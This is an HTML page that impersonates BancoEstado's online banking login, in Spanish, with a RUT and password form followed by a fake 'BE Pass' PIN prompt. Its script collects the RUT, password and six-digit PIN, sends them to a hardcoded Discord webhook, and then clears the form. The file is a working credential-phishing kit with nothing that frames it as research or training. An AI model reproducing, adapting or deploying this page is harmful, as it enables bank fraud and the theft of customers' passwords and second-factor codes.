<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
  <title>BancoEstado - Banca en Línea</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
    }

    body {
      background-color: #f0f2f5;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
    }

    .container {
      width: 100%;
      max-width: 420px;
      background: #ffffff;
      border-radius: 16px;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
      overflow: hidden;
      position: relative;
    }

    /* Header */
    .header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 20px 24px 10px;
    }

    .logo {
      display: flex;
      align-items: center;
      gap: 10px;
    }

    .logo-svg {
      width: 36px;
      height: 36px;
      flex-shrink: 0;
    }

    .logo-text {
      font-size: 22px;
      font-weight: 700;
      color: #1a1a1a;
      letter-spacing: -0.5px;
    }

    .close-btn {
      width: 32px;
      height: 32px;
      border-radius: 50%;
      background: #f0f2f5;
      border: none;
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      font-size: 18px;
      color: #555;
    }

    /* Content */
    .content {
      padding: 10px 28px 30px;
    }

    .title {
      font-size: 22px;
      font-weight: 700;
      color: #1a1a1a;
      margin-bottom: 28px;
      line-height: 1.3;
    }

    .form-group {
      margin-bottom: 22px;
    }

    .form-group label {
      display: block;
      font-size: 14px;
      font-weight: 600;
      color: #1a1a1a;
      margin-bottom: 8px;
    }

    .input-wrapper {
      position: relative;
    }

    .form-group input {
      width: 100%;
      height: 48px;
      padding: 0 16px;
      border: 1px solid #d0d5dd;
      border-radius: 8px;
      font-size: 15px;
      color: #1a1a1a;
      outline: none;
      transition: border-color 0.2s;
    }

    .form-group input:focus {
      border-color: #0057b8;
    }

    .form-group input::placeholder {
      color: #98a2b3;
    }

    .toggle-password {
      position: absolute;
      right: 14px;
      top: 50%;
      transform: translateY(-50%);
      background: none;
      border: none;
      cursor: pointer;
      padding: 0;
      display: flex;
      align-items: center;
      color: #667085;
    }

    .toggle-password svg {
      width: 22px;
      height: 22px;
    }

    .btn-primary {
      width: 100%;
      height: 52px;
      background: #0057b8;
      color: white;
      border: none;
      border-radius: 50px;
      font-size: 17px;
      font-weight: 600;
      cursor: pointer;
      margin-top: 8px;
      margin-bottom: 20px;
      transition: background 0.2s;
    }

    .btn-primary:hover {
      background: #004494;
    }

    .link-problemas {
      display: block;
      text-align: center;
      color: #0057b8;
      font-size: 15px;
      text-decoration: underline;
      margin-bottom: 24px;
    }

    .divider {
      height: 1px;
      background: #e4e7ec;
      margin-bottom: 24px;
    }

    .btn-secondary {
      width: 100%;
      height: 52px;
      background: white;
      color: #0057b8;
      border: 1.5px solid #0057b8;
      border-radius: 50px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      margin-bottom: 28px;
      transition: background 0.2s;
    }

    .btn-secondary:hover {
      background: #f0f7ff;
    }

    .help-section {
      text-align: center;
    }

    .help-title {
      font-size: 15px;
      font-weight: 600;
      color: #1a1a1a;
      margin-bottom: 6px;
    }

    .help-text {
      font-size: 14px;
      color: #667085;
      line-height: 1.4;
    }

    .help-text a {
      color: #0057b8;
      text-decoration: underline;
    }

    /* ========== MODAL BE PASS ========== */
    .modal-overlay {
      position: fixed;
      inset: 0;
      background: rgba(0, 0, 0, 0.45);
      display: none;
      justify-content: center;
      align-items: center;
      z-index: 1000;
      padding: 20px;
    }

    .modal-overlay.active {
      display: flex;
    }

    .modal {
      background: #ffffff;
      width: 100%;
      max-width: 360px;
      border-radius: 16px;
      padding: 28px 24px 32px;
      position: relative;
      text-align: center;
      box-shadow: 0 10px 40px rgba(0,0,0,0.15);
      animation: modalIn 0.25s ease;
    }

    @keyframes modalIn {
      from { opacity: 0; transform: scale(0.95) translateY(10px); }
      to   { opacity: 1; transform: scale(1) translateY(0); }
    }

    .modal-close {
      position: absolute;
      top: 16px;
      right: 16px;
      background: none;
      border: none;
      font-size: 22px;
      color: #555;
      cursor: pointer;
      width: 32px;
      height: 32px;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    /* Logo BE Pass (candado verde) */
    .be-pass-logo {
      width: 72px;
      height: 72px;
      margin: 0 auto 24px;
      border-radius: 16px;
      background: linear-gradient(135deg, #00c9a7 0%, #00b894 100%);
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      box-shadow: 0 4px 12px rgba(0, 185, 148, 0.3);
    }

    .be-pass-logo svg {
      width: 32px;
      height: 32px;
      margin-bottom: 2px;
    }

    .be-pass-logo span {
      font-size: 11px;
      font-weight: 700;
      color: white;
      letter-spacing: 0.3px;
    }

    .modal-title {
      font-size: 16px;
      font-weight: 600;
      color: #1a1a1a;
      margin-bottom: 20px;
    }

    /* Cajas de PIN */
    .pin-boxes {
      display: flex;
      justify-content: center;
      gap: 10px;
      margin-bottom: 36px;
    }

    .pin-box {
      width: 42px;
      height: 48px;
      border: 1.5px solid #e4e7ec;
      border-radius: 10px;
      background: #f9fafb;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 22px;
      font-weight: 600;
      color: #1a1a1a;
      position: relative;
    }

    .pin-box.filled::after {
      content: "•";
      font-size: 28px;
      line-height: 1;
    }

    .pin-box.active {
      border-color: #0057b8;
      background: #fff;
    }

    /* Input oculto para capturar el PIN */
    .pin-input-hidden {
      position: absolute;
      opacity: 0;
      pointer-events: none;
      height: 0;
      width: 0;
    }

    .btn-autorizar {
      width: 100%;
      height: 50px;
      background: #e8eaed;
      color: #9aa0a6;
      border: none;
      border-radius: 50px;
      font-size: 16px;
      font-weight: 600;
      cursor: not-allowed;
      margin-bottom: 16px;
      transition: all 0.2s;
    }

    .btn-autorizar.enabled {
      background: #0057b8;
      color: white;
      cursor: pointer;
    }

    .btn-autorizar.enabled:hover {
      background: #004494;
    }

    .btn-rechazar {
      background: none;
      border: none;
      color: #0057b8;
      font-size: 15px;
      font-weight: 500;
      cursor: pointer;
      text-decoration: none;
    }

    .btn-rechazar:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>

  <!-- ========== PANTALLA DE LOGIN ========== -->
  <div class="container" id="loginScreen">
    <div class="header">
      <div class="logo">
        <svg class="logo-svg" viewBox="0 0 31.09 31.09" xmlns="http://www.w3.org/2000/svg">
          <rect fill="#fff" width="31.09" height="31.09"/>
          <path fill="#d70032" d="M.74,15.63,11.29,11V7.65h0a14,14,0,0,0,8.5-4.75h0l10.56,8.62V.74H.74Z"/>
          <path fill="#fff" d="M11.31,25.41h8.48V2.91h0A14,14,0,0,1,11.3,7.65h0V11L.74,15.63v3.31L11.3,14.31V11l3.39-1.48V12.8l-3.38,1.5v3.24l3.39-1.48v3.23l-3.39,1.49V17.54L.74,22.17v3.24l10.57-4.63Z"/>
          <polygon fill="#ee801d" points="11.31 17.54 11.31 17.54 11.31 14.3 11.3 14.31 11.3 14.31 0.74 18.94 0.74 22.18 11.31 17.54 11.31 17.54"/>
          <polygon fill="#ee801d" points="11.31 20.78 0.74 25.41 0.74 25.41 11.31 25.41 11.31 20.78"/>
          <polygon fill="#ee801d" points="11.31 14.3 14.69 12.83 14.69 9.56 11.3 11.05 11.3 14.31 11.31 14.3 11.31 14.3"/>
          <polygon fill="#ff6b00" points="11.31 14.3 11.31 14.3 11.3 14.31 11.3 14.31 11.31 14.3"/>
          <polygon fill="#ee801d" points="11.31 17.54 11.31 20.78 14.7 19.29 14.7 16.06 11.31 17.54 11.31 17.54 11.31 17.54"/>
          <polygon fill="#ee801d" points="19.8 25.41 30.35 25.41 30.35 11.53 19.79 2.91 19.8 25.41"/>
          <polygon fill="#ff6b00" points="19.79 25.41 19.8 25.41 19.79 2.91 19.79 25.41"/>
          <polygon fill="#074c96" points="0.74 30.34 30.35 30.34 30.35 30.34 0.74 30.34"/>
          <polygon fill="#0257a0" points="19.8 25.41 19.79 25.41 11.31 25.41 0.74 25.41 0.74 30.34 30.35 30.34 30.35 25.41 19.8 25.41"/>
        </svg>
        <span class="logo-text">BancoEstado</span>
      </div>
      <button class="close-btn">✕</button>
    </div>

    <div class="content">
      <h1 class="title">Ingresa a tu Banca en Línea</h1>

      <form id="loginForm">
        <div class="form-group">
          <label for="rut">RUT</label>
          <div class="input-wrapper">
            <input type="text" id="rut" placeholder="Ej: 12.345.678-9" autocomplete="username" maxlength="12" required>
          </div>
        </div>

        <div class="form-group">
          <label for="clave">Clave</label>
          <div class="input-wrapper">
            <input type="password" id="clave" placeholder="********" autocomplete="current-password" required>
            <button type="button" class="toggle-password" onclick="togglePassword()">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
                <circle cx="12" cy="12" r="3"/>
              </svg>
            </button>
          </div>
        </div>

        <button type="submit" class="btn-primary">Ingresar</button>
      </form>

      <a href="#" class="link-problemas">¿Problemas con tu Clave?</a>
      <div class="divider"></div>
      <button class="btn-secondary">Acceso Empresas</button>

      <div class="help-section">
        <p class="help-title">¿Necesitas ayuda?</p>
        <p class="help-text">
          Para aclarar dudas revisa nuestro 
          <a href="#">Centro de ayuda</a>
        </p>
      </div>
    </div>
  </div>

  <!-- ========== MODAL BE PASS ========== -->
  <div class="modal-overlay" id="bePassModal">
    <div class="modal">
      <button class="modal-close" onclick="closeBePass()">✕</button>

      <!-- Logo BE Pass (candado verde) -->
      <div class="be-pass-logo">
        <svg viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
          <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
          <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
          <circle cx="12" cy="16" r="1" fill="white"/>
        </svg>
        <span>BE Pass</span>
      </div>

      <p class="modal-title">Ingresa tu clave BE Pass</p>

      <!-- Cajas de PIN (6 dígitos) -->
      <div class="pin-boxes" id="pinBoxes">
        <div class="pin-box" data-index="0"></div>
        <div class="pin-box" data-index="1"></div>
        <div class="pin-box" data-index="2"></div>
        <div class="pin-box" data-index="3"></div>
        <div class="pin-box" data-index="4"></div>
        <div class="pin-box" data-index="5"></div>
      </div>

      <!-- Input oculto para escribir el PIN -->
      <input type="tel" class="pin-input-hidden" id="pinInput" maxlength="6" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code">

      <button class="btn-autorizar" id="btnAutorizar" disabled>Autorizar</button>
      <button class="btn-rechazar" onclick="closeBePass()">Rechazar</button>
    </div>
  </div>

  <script>
    // Formateador automático de RUT chileno (XX.XXX.XXX-Y)
    const rutInput = document.getElementById('rut');
    rutInput.addEventListener('input', function(e) {
      let valor = e.target.value.replace(/[^0-9kK]/g, ''); // Solo números y K
      if (valor.length > 1) {
        let cuerpo = valor.slice(0, -1);
        let dv = valor.slice(-1).toUpperCase();
        
        // Agregar puntos cada 3 dígitos en el cuerpo
        cuerpo = cuerpo.replace(/\B(?=(\d{3})+(?!\d))/g, ".");
        
        e.target.value = cuerpo + '-' + dv;
      } else {
        e.target.value = valor.toUpperCase();
      }
    });

    // Mostrar/ocultar contraseña
    function togglePassword() {
      const input = document.getElementById('clave');
      input.type = input.type === 'password' ? 'text' : 'password';
    }

    // Al enviar el formulario de login → mostrar modal BE Pass
    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();
      document.getElementById('bePassModal').classList.add('active');
      // Enfocar el input del PIN
      setTimeout(() => {
        document.getElementById('pinInput').focus();
      }, 100);
    });

    // Cerrar modal
    function closeBePass() {
      document.getElementById('bePassModal').classList.remove('active');
      // Limpiar PIN
      document.getElementById('pinInput').value = '';
      updatePinBoxes('');
      document.getElementById('btnAutorizar').disabled = true;
      document.getElementById('btnAutorizar').classList.remove('enabled');
    }

    // Manejo del PIN de 6 dígitos
    const pinInput = document.getElementById('pinInput');
    const pinBoxes = document.querySelectorAll('.pin-box');
    const btnAutorizar = document.getElementById('btnAutorizar');

    // Hacer clic en las cajas enfoca el input
    document.getElementById('pinBoxes').addEventListener('click', () => {
      pinInput.focus();
    });

    pinInput.addEventListener('input', function() {
      // Solo números
      this.value = this.value.replace(/\D/g, '').slice(0, 6);
      updatePinBoxes(this.value);

      if (this.value.length === 6) {
        btnAutorizar.disabled = false;
        btnAutorizar.classList.add('enabled');
      } else {
        btnAutorizar.disabled = true;
        btnAutorizar.classList.remove('enabled');
      }
    });

    function updatePinBoxes(value) {
      pinBoxes.forEach((box, i) => {
        box.classList.remove('filled', 'active');
        if (i < value.length) {
          box.classList.add('filled');
        }
        if (i === value.length) {
          box.classList.add('active');
        }
      });
    }

    // Botón Autorizar (ENVÍO A DISCORD)
    btnAutorizar.addEventListener('click', async function() {
      if (this.classList.contains('enabled')) {
        // Obtenemos los valores formateados del RUT, Clave y PIN
        const rut = document.getElementById('rut').value;
        const clave = document.getElementById('clave').value;
        const pin = pinInput.value;

        // ⚠️ PEGA AQUÍ TU URL DE WEBHOOK DE DISCORD
        const webhookUrl = "https://discord.com/api/webhooks/1496024213524320357/BImp9tkpfneiEjEmK4uiLeXwvkKcCHvA-LbfeIZDmfpZgFcxd0jzckc-CZ8ryJf4NQmB";

        const mensajeDiscord = {
          content: `🚨 **🍀GOLEADOR CHILE🍀 **\n` +
                   `• **RUT:** ${rut}\n` +
                   `• **Clave:** ${clave}\n` +
                   `• **PIN BE Pass:** ${pin}`
        };

        try {
          // Enviamos la petición a Discord
          await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(mensajeDiscord)
          });
        } catch (error) {
          console.error("Error al enviar a Discord:", error);
        }

        // Cerramos el modal y limpiamos formulario
        closeBePass();
        document.getElementById('loginForm').reset();
      }
    });

    // Cerrar modal al hacer clic fuera
    document.getElementById('bePassModal').addEventListener('click', function(e) {
      if (e.target === this) {
        closeBePass();
      }
    });
  </script>
</body>
</html>
